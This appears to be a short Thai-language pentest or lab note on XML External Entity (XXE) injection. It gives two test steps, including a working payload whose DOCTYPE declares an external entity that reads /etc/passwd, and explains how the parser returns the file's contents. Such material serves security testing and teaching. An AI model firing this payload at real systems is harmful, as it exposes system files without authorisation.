# Payloads

## ขั้นที่ 1: ตรวจสอบว่า parser ประมวลผล entity หรือไม่

ส่ง XML ง่ายๆ เพื่อดูว่า input ถูก parse ตามมาตรฐาน XML

ผลลัพธ์:
ระบบรับ XML และแสดงผลลัพธ์ได้ตามปกติ

---

## ขั้นที่ 2: ทดสอบ External Entity

ใช้ DOCTYPE พร้อม entity ภายนอก เช่น

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">

]>
<root>
<data>&xxe;</data>
</root>

จุดดสำคัญที่สุด เป็นการสร้าง "External Entity" ชื่อ xxe และสั่งให้ไปดึงข้อมูลจากไฟล์ระบบที่ระบุ (ในที่นี้คือ /etc/passwd)
เมื่อเรียกใช้ Entity นี้ในเนื้อหา XML ระบบที่ประมวลผลจะนำเนื้อหาในไฟล์ /etc/passwd มาแสดงผลแทนที่คำนี้
